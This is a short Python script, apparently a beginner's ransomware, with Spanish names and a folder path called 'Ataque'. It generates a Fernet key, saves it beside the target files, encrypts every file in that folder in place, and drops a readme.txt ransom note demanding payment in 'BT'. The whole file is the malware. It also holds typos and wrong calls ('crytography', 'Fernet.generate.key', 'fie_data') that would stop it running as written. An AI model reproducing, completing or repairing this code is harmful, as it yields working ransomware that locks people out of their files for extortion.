from crytography.fernet import Fernet
import os


def generateKey():
    key = Fernet.generate.key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)

def retornarKey():
    return open("key.key", "rb").read()

def encrypt(items, key):
    i = Fernet(key)
    for x in items:
        with open(x, "rb") as file:
            file_data = file.read()
        data =i.encrypt(fie_data)

        with open(x, "wb") as file:
            file.write(data)

if __name__ == "__main__":


    archivos = 'C:\\Users\\Brian\\Desktop\\Ataque\\Archivos'
    items = os.listdir(archivos)
    archivos_2 = [archivos+"\\"+x for x in items]



generateKey()
key = retornarKey()

encrypt(archivos_2, key)

with open(archivos+"\\"+"readme.txt", "w") as file:
    file.write("Archivos encriptados por User@root\n")
    file.write("Se Solicita rescate en BT")